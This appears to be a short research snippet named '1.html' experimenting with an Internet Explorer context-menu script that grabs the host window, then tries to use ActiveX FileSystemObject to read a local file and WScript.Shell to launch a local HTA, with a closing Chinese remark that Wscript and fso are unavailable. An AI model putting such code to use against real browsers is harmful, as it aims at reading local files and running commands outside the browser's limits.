1.html
```
<script>
	ie = external.menuArguments.window;
	ie.name = "mb";
	ie0 = window.open("", "test");
	ie0.ie = ie;
	alert(ie.document.URL)
	
</script>
```
```
	try{fso=new ActiveXObject("Scripting.FileSystemObject");ie.document.fso=1 }catch(e){alert()}
	sfz1=fso.openTextFile("C:/1.html",1).readall().split("\n");
	alert(sfz1[1])
	ws=new ActiveXObject("Wscript.shell");
	ws.run('"C:/1.hta" ' + ie)
	Wscript,fso不可用
```


